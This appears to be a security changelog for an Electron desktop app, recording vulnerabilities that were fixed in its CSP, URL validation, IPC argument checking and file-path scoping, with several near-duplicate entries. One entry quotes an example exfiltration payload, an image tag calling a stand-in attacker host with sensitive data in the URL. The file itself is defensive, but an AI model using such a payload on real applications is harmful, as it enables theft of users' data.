
## 2025-02-24 - JSON Parse Prototype Pollution Fixed
Replaced `JSON.parse` with `destr` in `safeParse` to mitigate prototype pollution. The `destr` library safely drops `__proto__` keys during parsing, preventing potential privilege escalation or data corruption from malformed LLM responses.

## 2025-02-25 - Removed unsafe-eval from Content-Security-Policy
**Vulnerability:** The Electron app's `Content-Security-Policy` included `'unsafe-eval'` in its `script-src` directive. This allowed arbitrary code execution if an attacker could inject a string into an `eval()` or similar function call.
**Learning:** CSP headers need to be strictly configured, especially in desktop applications where arbitrary code execution can have severe system-level consequences. Even if the current codebase doesn't use `eval()`, third-party libraries might, or an attacker could find a way to inject it.
**Prevention:** Always follow defense-in-depth principles. Do not include `'unsafe-eval'` in CSP unless absolutely necessary, and if so, document why and ensure all user inputs are strictly sanitized. Regular automated security scanning of CSP headers should be implemented.

## 2025-05-07 - Secure URL parsing for shell.openExternal
**Vulnerability:** The Electron app passed `url` string values directly to `shell.openExternal` after only a naive string comparison (`url.startsWith("https:")`). This could be exploited by protocol smuggling or OS-specific parsing quirks.
**Learning:** Naive string matching on URLs is dangerous. Depending on the operating system handler, malformed strings or edge-case protocol combinations might bypass simple string checks, leading to arbitrary command execution or file access.
**Prevention:** Always instantiate a `new URL()` object when handling untrusted URLs and strictly verify the `protocol` property before passing it to native handlers like `shell.openExternal`. Wrap it in a `try...catch` to prevent malformed URL exceptions from crashing the process.

## 2025-02-27 - Unsafe URL Validation in will-navigate
**Vulnerability:** The Electron app used `navigationUrl.startsWith("file://")` to check if a local file was being navigated to during the `will-navigate` event. This could be bypassed using URLs that start with "file://" but are actually malicious or invalid.
**Learning:** Checking string prefixes for URL validation is fundamentally insecure because strings can easily trick weak patterns.
**Prevention:** Always parse untrusted URLs using the standard `new URL(url)` API and verify the `protocol` property exactly (e.g., `parsedUrl.protocol === "file:"`). Wrap the parsing in a `try...catch` to prevent invalid URLs from crashing the handler or bypassing security checks.

## 2025-05-08 - Block Unrestricted Local File Navigation
**Vulnerability:** The Electron app's `will-navigate` event handler permitted navigation to any `file:` protocol URL (`parsedUrl.protocol === "file:"`). This allowed navigation to arbitrary, potentially malicious local HTML files which could then execute within the privileged Electron renderer context and abuse exposed IPC APIs.
**Learning:** Naively allowing all `file:` navigation undermines Electron sandbox security, as it trusts any local file implicitly. Only explicitly trusted origins (e.g., the dev server) should be permitted during in-page navigation. Production files loaded via `loadFile()` don't inherently require enabling `will-navigate`.
**Prevention:** Strictly deny all `will-navigate` events by default (`event.preventDefault()`). Only explicitly allow known, safe origins (like the dev server's exact origin, verified via `URL.origin`, not `startsWith`) if necessary.

## 2025-05-09 - Missing Runtime Validation on IPC Handlers
**Vulnerability:** The Electron app's `app:getPath` IPC handler used TypeScript type assertions (`as 'home' | 'userData' | ...`) to implicitly restrict the `name` argument from the renderer. However, since TypeScript is stripped during compilation, any string could be passed from the renderer at runtime. This meant a compromised renderer process could request arbitrary paths (e.g., `exe`, `module`, `crashDumps`) that might expose sensitive system directories or facilitate further exploits.
**Learning:** Type assertions are compile-time only and provide zero runtime security. When dealing with boundary interfaces like IPC where untrusted data enters a privileged context (the main process), runtime validation is mandatory.
**Prevention:** Never rely on TypeScript assertions (`as Type`) for input validation on IPC boundaries. Always implement strict runtime validation, such as explicit allowlists (e.g., `const ALLOWED_PATHS = [...] as const` and `ALLOWED_PATHS.includes()`), to verify arguments before passing them to privileged Electron or Node.js APIs.

## 2025-05-27 - Validate IPC Arguments at Runtime
**Vulnerability:** The `app:getPath` IPC handler relied purely on a TypeScript type assertion (`name as "home" | "appData" | ...`) to limit which paths could be requested from the main process. Since type checking is stripped at runtime, any string could be passed via IPC from the renderer, potentially allowing an attacker to request sensitive paths like `exe` or `module`.
**Learning:** TypeScript type boundaries do not exist at runtime in JavaScript. IPC handlers are security boundaries between the less trusted renderer process and the privileged main process. Any data crossing this boundary must be rigorously validated at runtime.
**Prevention:** Always implement strict runtime validation (such as explicit allowlists) for any arguments passed over IPC before using them in privileged main process APIs. Never rely solely on TypeScript type assertions for security.

## 2025-05-29 - Unsafe IPC Type Assertions
**Vulnerability:** The Electron app's `app:getPath` IPC handler relied on TypeScript type assertions (e.g. `name as 'home' | 'appData' ...`) for input validation. Because TypeScript types are stripped at runtime, this provided no actual protection against a compromised renderer sending arbitrary strings. An attacker could potentially request unintended application paths.
**Learning:** Type assertions in IPC handlers provide a false sense of security. Any data coming from the renderer must be considered untrusted and strictly validated at runtime.
**Prevention:** Always implement explicit runtime validation (such as allowlists) for arguments passed over IPC before using them in privileged main process APIs. Never rely solely on TypeScript types for security boundaries.

## 2025-05-30 - Prevent Main Process DoS via Unvalidated IPC Types
**Vulnerability:** The Electron app's `validatePath` function (used across multiple `fs:*` IPC handlers) implicitly assumed the `filePath` argument received from the renderer was a string before passing it to `path.resolve()`. Because IPC boundaries don't enforce type boundaries at runtime, a malicious payload from the renderer could pass an object or a number, causing `path.resolve` to throw a `TypeError: The "paths[0]" argument must be of type string` and crashing the entire main process (Denial of Service).
**Learning:** Type boundaries do not exist at runtime for IPC payloads. Standard Node.js functions (like `path.resolve`) are often strict about their input types and will throw unhandled exceptions if fed incorrect types, leading to crashes in the main process.
**Prevention:** Always perform explicit runtime type validation (e.g., `typeof arg !== 'string'`) on parameters received from IPC handlers before passing them to native APIs or standard library functions, to prevent unexpected types from causing crashes or unpredictable behavior.
## 2024-05-18 - [Denial of Service via Unvalidated Electron IPC Arguments]
**Vulnerability:** Electron IPC handlers (`fs:*`, `storage:*`, `app:getPath`) passed unvalidated arguments directly to native Node APIs (`fs.readFile`, `path.resolve`, `electron-store`).
**Learning:** Because TypeScript types are stripped at runtime, a malicious renderer (e.g., via XSS) could pass unexpected types (like objects or arrays instead of strings) over IPC. When passed to strict APIs (like `app.getPath`), this throws synchronous, unhandled exceptions that crash the entire main process (Denial of Service).
**Prevention:** Always implement explicit runtime type checking (e.g., `typeof arg === "string"`) for any arguments passed over IPC before invoking strict Node.js functions or electron APIs.

## 2025-06-07 - Prevent Main Process DoS via Unvalidated IPC Object Arguments
**Vulnerability:** The Electron app's IPC handlers for dialogs (`dialog:showSaveDialog`, `dialog:showOpenDialog`) and notifications (`notification:show`) expected object parameters (`options`) from the renderer but did not perform runtime validation. Since type boundaries don't exist at runtime, a malicious renderer payload could pass unexpected types (like strings or numbers) over IPC. Passing these unvalidated types to strict Electron native APIs (like `dialog.showOpenDialog`) could cause synchronous unhandled exceptions, leading to a denial-of-service crash of the main process.
**Learning:** Type boundaries do not exist at runtime for IPC payloads. Native Electron APIs are strict about their input types and will throw unhandled exceptions if fed incorrect types, leading to crashes in the main process.
**Prevention:** Always perform explicit runtime type validation for object parameters (e.g., `typeof options === 'object' && options !== null && !Array.isArray(options)`) on arguments received from IPC handlers before passing them to native APIs, to prevent unexpected types from causing crashes or unpredictable behavior.

## 2025-06-14 - Prevent Main Process DoS via Unvalidated UI IPC Payloads
**Vulnerability:** Electron IPC handlers (`notification:show`, `dialog:showSaveDialog`, `dialog:showOpenDialog`) passed unvalidated `options` objects directly to native Node.js and Electron APIs. Because TypeScript types are stripped at runtime, a malicious renderer process could send strings, numbers, arrays, or null where an object was expected, causing synchronous unhandled exceptions that crash the main process (Denial of Service).
**Learning:** Object payloads coming over IPC boundaries must be strictly validated. Checking `typeof options === 'object'` is not enough because `null` and arrays are also 'objects' in JavaScript, which can still break strict native APIs.
**Prevention:** Always implement explicit runtime type checking (e.g., verifying it's a non-null, non-array object and validating its expected properties) for any arguments passed over IPC before invoking strict native APIs like `Notification` or `dialog`.

## 2025-06-14 - Content Security Policy (CSP) Data Exfiltration Risk
**Vulnerability:** The Content Security Policy for the Electron app (`electron/main.ts`) allowed external `http:` and `https:` connections (`connect-src 'self' ws: http: https:;`).
**Learning:** This overly permissive CSP undermines the principle of least privilege. In an offline-first deterministic simulation app, external HTTP requests are not required. Allowing them exposes the app to potential data exfiltration via XSS or other vulnerabilities.
**Prevention:** Always restrict `connect-src` in the CSP to strictly necessary origins (e.g., `'self'` and specific WebSockets for HMR) and avoid generic `http:` or `https:` allowances in offline Electron applications.

## 2025-06-21 - Restrict IPC File Operations to Subdirectories
**Vulnerability:** The Electron IPC handlers (`fs:readFile`, `fs:writeFile`, etc.) in `main.ts` validated file paths against the entire `app.getPath("userData")` directory. This exposed sensitive peer configuration files (e.g., `electron-store` files, cookies, preferences) stored in `userData` to potential path traversal or unauthorized access by a compromised renderer process.
**Learning:** Security boundaries should enforce the principle of least privilege. If the application only needs to manage specific files (like game archives), the allowed base directory for IPC file operations should be restricted to the specific subdirectory needed, rather than the parent directory containing sensitive app data.
**Prevention:** When validating paths in Electron IPC handlers, strictly limit the `allowedBaseDir` to the most restrictive subdirectory required by the application (e.g., `path.join(app.getPath('userData'), 'archives')`). Do not use broad directories like `userData` directly if only a subset of files is needed.
## 2024-06-22 - Data Exfiltration via CSP img-src
**Vulnerability:** The Electron app's Content-Security-Policy (CSP) allowed `https:` in the `img-src` directive. This could allow an attacker who finds an XSS or HTML injection vulnerability to exfiltrate sensitive local data by appending it to an external image request URL (e.g., `<img src="https://attacker.com/log?data=sensitive" />`).
**Learning:** Even if `connect-src` is restricted, data exfiltration can still occur through other seemingly harmless directives like `img-src`. Since this is an offline-first app, there is no need to load external images over HTTPS.
**Prevention:** Strictly limit `img-src` to local origins (`'self'` and `data:`) in offline-first applications.
